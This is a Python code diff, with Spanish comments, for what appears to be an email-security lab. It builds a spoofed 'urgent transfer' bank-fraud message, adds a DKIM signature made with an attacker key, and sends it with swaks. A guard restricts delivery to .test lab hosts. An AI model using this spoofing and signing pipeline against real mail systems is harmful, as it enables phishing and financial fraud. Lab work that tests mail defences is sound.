@@ -1,4 +1,4 @@
-"""Piezas comunes de los ataques: validación de destino, texto del fraude y envío con swaks."""
+"""Piezas comunes de los ataques: validación de destino, mensaje, firma DKIM y envío con swaks."""
 
 from __future__ import annotations
 
@@ -6,11 +6,22 @@ import re
 import subprocess
 import uuid
 from dataclasses import asdict, dataclass
+from email.message import EmailMessage
+from email.policy import SMTP
+from email.utils import formatdate
+from pathlib import Path
+
+import dkim
 
 # Regla 3 de CLAUDE.md: solo dominios .test y solo el host «receptor».
 ALLOWED_SERVER = "receptor"
 DEFAULT_RECIPIENT = "empleado@bancoseguro.test"
 _TEST_DOMAIN = re.compile(r"^[a-z0-9-]+(\.[a-z0-9-]+)*\.test$")
+
+KEYS_DIR = Path("/run/atacante/llaves")
+# Cabeceras que firma el atacante (las mismas que firmaría un servidor normal).
+SIGNED_HEADERS = [b"From", b"To", b"Subject", b"Date", b"Message-ID", b"MIME-Version",
+                  b"Content-Type", b"Content-Transfer-Encoding"]  # fmt: skip
 
 SUBJECT = "Transferencia urgente"
 ATTACKER_ACCOUNT = "9999-6666-00"
@@ -30,6 +41,10 @@ Banco Seguro
 
 class DestinationError(ValueError):
     """El destino no es del laboratorio: el ataque no se envía."""
+
+
+class AttackError(RuntimeError):
+    """El ataque no se puede preparar (mensaje en español para mostrar)."""
 
 
 def validate_destination(recipient: str, server: str) -> None:
@@ -66,9 +81,41 @@ class AttackResult:
     envelope_from: str
     header_from: str
     transcript: str
+    note: str = ""
 
     def to_dict(self) -> dict[str, object]:
         return asdict(self)
+
+
+def domain_of(address: str) -> str:
+    return address.rpartition("@")[2].strip('<>" ').lower()
+
+
+def build_message(attack: Attack, recipient: str) -> tuple[bytes, str]:
+    """Mensaje del fraude con el From: del ataque. Devuelve (bytes con CRLF, Message-ID)."""
+    message_id = f"{uuid.uuid4()}@{domain_of(attack.header_from)}"
+    msg = EmailMessage(policy=SMTP)
+    msg["From"] = attack.header_from
+    msg["To"] = recipient
+    msg["Subject"] = SUBJECT
+    msg["Date"] = formatdate(localtime=True)
+    msg["Message-ID"] = f"<{message_id}>"
+    msg.set_content(BODY)
+    return msg.as_bytes(), message_id
+
+
+def dkim_sign(raw: bytes, domain: str, selector: str) -> bytes:
+    """Agrega una firma DKIM válida de `domain` con la llave del atacante."""
+    key = (KEYS_DIR / f"{selector}.private").read_bytes()
+    signature = dkim.sign(
+        raw,
+        selector.encode(),
+        domain.encode(),
+        key,
+        canonicalize=(b"relaxed", b"relaxed"),
+        include_headers=SIGNED_HEADERS,
+    )
+    return signature + raw
 
 
 _REPLY = re.compile(r"^<(-|\*\*) +(\d{3})[ -](.*)$")
@@ -96,14 +143,16 @@ def summarize_swaks(transcript: str) -> tuple[int, str]:
     return code, text
 
 
-def send_with_swaks(
+def send_raw(
     attack: Attack,
+    raw: bytes,
+    message_id: str,
     recipient: str = DEFAULT_RECIPIENT,
     server: str = ALLOWED_SERVER,
-    extra_args: list[str] | None = None,
+    note: str = "",
 ) -> AttackResult:
+    """Envía el mensaje tal cual con swaks desde la IP del atacante."""
     validate_destination(recipient, server)
-    message_id = f"<{uuid.uuid4()}@{attack.header_from.rpartition('@')[2].rstrip('>')}>"
     cmd = [
         "swaks",
         "--server", server,
@@ -111,26 +160,35 @@ def send_with_swaks(
         "--helo", "mail.atacante.test",
         "--from", attack.envelope_from,
         "--to", recipient,
-        "--header", f"From: {attack.header_from}",
-        "--header", f"Subject: {SUBJECT}",
-        "--header", f"Message-Id: {message_id}",
-        "--header", "MIME-Version: 1.0",
-        "--header", "Content-Type: text/plain; charset=UTF-8",
-        "--header", "Content-Transfer-Encoding: 8bit",
-        "--body", BODY,
+        "--data", "-",  # el mensaje completo llega por la entrada estándar
+        "--suppress-data",
         "--timeout", "30",
-        *(extra_args or []),
     ]  # fmt: skip
-    proc = subprocess.run(cmd, capture_output=True, text=True, timeout=60, check=False)
-    transcript = proc.stdout + proc.stderr
+    proc = subprocess.run(cmd, input=raw, capture_output=True, timeout=60, check=False)
+    transcript = (proc.stdout + proc.stderr).decode(errors="replace")
     code, reply = summarize_swaks(transcript)
     return AttackResult(
         attack=attack.id,
         accepted=200 <= code < 300,
         code=code,
         reply=reply,
-        message_id=message_id.strip("<>"),
+        message_id=message_id,
         envelope_from=attack.envelope_from,
         header_from=attack.header_from,
         transcript=transcript,
+        note=note,
     )
+
+
+def send_simple(
+    attack: Attack,
+    recipient: str = DEFAULT_RECIPIENT,
+    server: str = ALLOWED_SERVER,
+    sign_with: tuple[str, str] | None = None,
+) -> AttackResult:
+    """Arma el mensaje del fraude, lo firma si se pide (dominio, selector) y lo envía."""
+    validate_destination(recipient, server)
+    raw, message_id = build_message(attack, recipient)
+    if sign_with:
+        raw = dkim_sign(raw, *sign_with)
+    return send_raw(attack, raw, message_id, recipient, server)
